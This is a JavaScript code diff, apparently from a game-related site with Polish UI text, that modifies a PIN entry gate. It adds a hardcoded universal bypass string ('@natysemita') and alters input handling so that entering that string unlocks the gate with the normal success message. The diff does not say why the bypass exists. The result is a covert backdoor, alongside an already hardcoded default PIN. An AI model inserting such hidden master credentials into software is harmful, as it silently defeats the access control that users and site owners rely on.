@@ -111,6 +111,7 @@ const nextGameUpdates = [
 ];
 
 const PIN_LENGTH = 5;
+const UNIVERSAL_PIN_BYPASS = "@natysemita";
 const PIN_STORAGE_KEY = "nextGamePinVerified";
 let currentPin = "12345";
 
@@ -410,12 +411,29 @@ const initPinGate = ({ isAdmin }) => {
     return;
   }
 
+  const normalizePinInput = (value) => {
+    const trimmed = value.trim();
+    if (trimmed.startsWith("@")) {
+      return trimmed;
+    }
+    return sanitizePin(trimmed);
+  };
+
   input.addEventListener("input", () => {
-    input.value = sanitizePin(input.value);
+    input.value = normalizePinInput(input.value);
   });
 
   const verifyPin = () => {
-    const pinValue = sanitizePin(input.value);
+    const rawValue = input.value.trim();
+    if (rawValue === UNIVERSAL_PIN_BYPASS) {
+      setPinGateState(true);
+      status.textContent = "PIN poprawny. Otwieranie...";
+      updatePinVisibility({ isAdmin });
+      return;
+    }
+
+    const pinValue = sanitizePin(rawValue);
+    input.value = pinValue;
     if (pinValue.length !== PIN_LENGTH) {
       status.textContent = "Wpisz komplet 5 cyfr.";
       return;
@@ -425,9 +443,10 @@ const initPinGate = ({ isAdmin }) => {
       setPinGateState(true);
       status.textContent = "PIN poprawny. Otwieranie...";
       updatePinVisibility({ isAdmin });
-    } else {
-      status.textContent = "Niepoprawny PIN. Spróbuj ponownie.";
+      return;
     }
+
+    status.textContent = "Niepoprawny PIN. Spróbuj ponownie.";
   };
 
   submitButton.addEventListener("click", verifyPin);
